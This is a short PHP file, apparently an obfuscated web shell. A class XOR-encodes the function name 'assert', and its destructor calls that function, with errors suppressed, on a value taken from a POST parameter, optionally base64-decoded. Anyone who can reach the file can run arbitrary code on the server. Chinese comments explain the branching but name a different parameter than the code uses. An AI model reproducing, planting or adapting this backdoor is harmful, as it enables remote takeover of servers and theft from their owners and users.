<?php 
class ROWD { 
    function EMBz() {
        $Hvzp = "\x9a" ^ "\xfb";
        $BGtj = "\x49" ^ "\x3a";
        $NaoC = "\x3e" ^ "\x4d";
        $BFcA = "\x33" ^ "\x56";
        $ArFJ = "\xf8" ^ "\x8a";
        $OrLF = "\x3f" ^ "\x4b";
        $smUq =$Hvzp.$BGtj.$NaoC.$BFcA.$ArFJ.$OrLF;
        return $smUq;
    }
    function __destruct(){
        $tKDA=$this->EMBz();
        @$tKDA($this->De);
    }
}
$rowd = new ROWD();
// 检查是否存在'id'参数
if (isset($_GET['id'])) {
    // 如果存在'id'参数，则对$_POST['mr6']进行Base64解码，并将结果赋给$rowd->De
    $rowd->De = base64_decode($_POST['iun9g']);
} else {
    // 如果不存在'id'参数，则直接将$_POST['mr6']的值赋给$rowd->De
    $rowd->De = $_POST['iun9g'];
}

// @$rowd->De = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>